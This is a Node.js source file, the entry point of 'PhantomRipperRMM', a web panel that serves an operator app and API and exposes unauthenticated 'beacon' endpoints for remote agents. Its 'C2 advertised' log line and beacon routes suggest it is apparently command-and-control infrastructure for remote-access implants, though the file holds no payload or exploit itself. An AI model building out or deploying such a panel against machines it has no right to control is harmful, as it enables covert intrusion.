'use strict';

/**
 * PhantomRipperRMM — panel entry point.
 * Express (HTTP + operator/agent API) + ws on one port. Serves the SPA from
 * ./public. Deployable to Railway (MySQL) or a VPS (SQLite or MySQL).
 */

const http = require('http');
const path = require('path');
const express = require('express');
const cookieParser = require('cookie-parser');

const config = require('./config');
const store = require('./store');
const auth = require('./auth');
const ws = require('./ws');
const sessions = require('./sessionManager');
const notify = require('./notify');

const authRoutes = require('./routes/auth');
const beaconRoutes = require('./routes/beacon');
const apiRoutes = require('./routes/api');

const app = express();
app.disable('x-powered-by');
app.set('trust proxy', true);

app.use(express.json({ limit: '25mb' }));
app.use(express.urlencoded({ extended: true, limit: '25mb' }));
app.use(cookieParser());

// Healthcheck (unauthenticated).
app.get('/api/health', async (req, res) => {
  let dbOk = false;
  try { dbOk = await store.ping(); } catch (_) { /* noop */ }
  res.json({
    status: 'ok',
    name: 'PhantomRipperRMM',
    version: '0.1.0',
    time: new Date().toISOString(),
    db: { dialect: store.dialect, connected: dbOk },
    online: ws.onlineAgents().length,
  });
});

// Agent-facing beacon endpoints (no operator auth).
app.use('/api', beaconRoutes);

// Operator auth + API.
app.use('/api/auth', authRoutes);
app.use('/api', apiRoutes);

// Static SPA.
const publicDir = path.join(__dirname, '..', 'public');
app.use(express.static(publicDir, { index: false }));
app.get('/', (req, res) => res.sendFile(path.join(publicDir, 'index.html')));
app.get(/^\/(?!api|ws).*/, (req, res) => res.sendFile(path.join(publicDir, 'index.html')));

// Central error handler.
app.use((err, req, res, next) => {
  // eslint-disable-next-line no-console
  console.error('[error]', err.message);
  if (res.headersSent) return next(err);
  res.status(500).json({ error: 'internal error' });
});

async function main() {
  await store.init();
  await auth.bootstrapAdmin();
  notify.wire(ws.bus);

  const server = http.createServer(app);
  ws.attach(server);

  server.listen(config.port, config.host, () => {
    const banner = `
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
        R I P P E R   R M M   —   panel v0.1.0
`;
    // eslint-disable-next-line no-console
    console.log(banner);
    // eslint-disable-next-line no-console
    console.log(`[panel] listening on http://${config.host}:${config.port}`);
    // eslint-disable-next-line no-console
    console.log(`[panel] store: ${store.dialect}${store.dialect === 'mysql' ? ' (Railway)' : ''}`);
    // eslint-disable-next-line no-console
    console.log(`[panel] C2 advertised: ${config.c2.scheme}://${config.c2.host}:${config.c2.port}`);
    sessions.logEvent('system', `panel started (${store.dialect})`, 'info', { port: config.port }).catch(() => {});
  });
}

main().catch((err) => {
  // eslint-disable-next-line no-console
  console.error('[fatal] startup failed:', err);
  process.exit(1);
});

module.exports = app;
